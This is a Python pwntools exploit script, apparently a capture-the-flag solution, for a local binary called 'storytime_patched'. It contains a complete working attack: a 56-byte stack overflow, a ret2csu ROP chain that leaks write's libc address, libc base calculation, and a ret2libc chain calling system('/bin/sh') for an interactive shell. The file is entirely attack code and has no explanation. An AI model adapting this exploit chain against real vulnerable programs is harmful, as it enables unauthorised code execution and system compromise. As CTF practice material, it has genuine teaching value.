from pwn import *

p = process(["./storytime_patched"])

libc = ELF("./libc.so.6",checksec=False)
elf = ELF("./storytime_patched",checksec=False)

# context.log_level = 'debug'

def ret2csu(call,rdi,rsi,rdx):
    p = p64(0x4006fa) # 1st caller
    p += p64(0x0)     # rbx
    p += p64(0x1)     # rpb set to 1, will compare to rbx after add with 1
    p += p64(call)     # r12
    p += p64(rdi)      # r13
    p += p64(rsi)      # r14
    p += p64(rdx)      # r15
    p += p64(0x4006e0) # 2nd caller
    p += p64(0x0)      # junk add rsp,0x8
    p += p64(0x0)      # rbx
    p += p64(0x0)      # rbp
    p += p64(0x0)      # r12
    p += p64(0x0)      # r13
    p += p64(0x0)      # r14
    p += p64(0x0)      # r15
    return p

## Gadget
pop_rdi = 0x0000000000400703
pop_rsi_r15 = 0x0000000000400701
call_write = 0x0000000000400601 # write(1,rsi,0x28) -> end()
call_write2 = 0x00000000004005c7 # write(1,rsi,0x28) -> beginning()
ret = 0x000000000040048e

## elf func
write_got = elf.got['write']
# write_plt = elf.plt['write']
main_ = elf.symbols['main']

offset = b'A'*56

payload = offset 
payload += p64(pop_rsi_r15)
payload += p64(write_got)
payload += p64(0x0)
payload += p64(call_write)
payload += p64(ret)
payload += p64(main_)

payload = offset
payload += ret2csu(write_got,1,write_got,8)
payload += p64(main_)

p.sendlineafter(b": \n",payload)

leaks = u64(p.recvuntil(b'\x00',drop=True).ljust(8,b'\x00'))

libc.address = leaks - libc.symbols['write']

libc_system = libc.symbols['system']
libc_binsh = next(libc.search(b'/bin/sh\x00'))

log.success("Libc Base: " + hex(libc.address))
log.success("Libc system: " + hex(libc_system))
log.success("Libc /bin/sh: " + hex(libc_binsh))

payload = offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(libc_binsh)
payload += p64(libc_system)

p.sendlineafter(b": \n",payload)

p.interactive()